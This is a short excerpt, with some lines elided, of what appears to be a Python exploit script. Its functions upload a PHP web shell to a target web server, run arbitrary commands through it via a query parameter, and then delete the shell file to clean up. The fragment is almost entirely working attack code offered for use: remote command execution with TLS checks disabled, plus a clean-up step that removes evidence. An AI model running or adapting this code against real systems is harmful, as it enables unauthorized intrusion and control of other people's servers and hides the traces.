...
def upload_shell(url, shell_filename):
	...
	time.sleep(2)
	response = requests.get('%s/shell.php?c=id' % (url), verify=False)
...
def interactive_shell(url, shell_filename, cmd):
	response = requests.get('%s/shell.php?c=%s' % (url, urllib.parse.quote(cmd, safe='')), verify=False)
	print(str(response.text)+"\n")
 
 
def delete_shell(url, shell_filename):
	delcmd = "rm /usr/local/www/shell.php"
	response = requests.get('%s/shell.php?c=%s' % (url, urllib.parse.quote(delcmd, safe='')), verify=False)
	print("\n[+] Shell deleted")
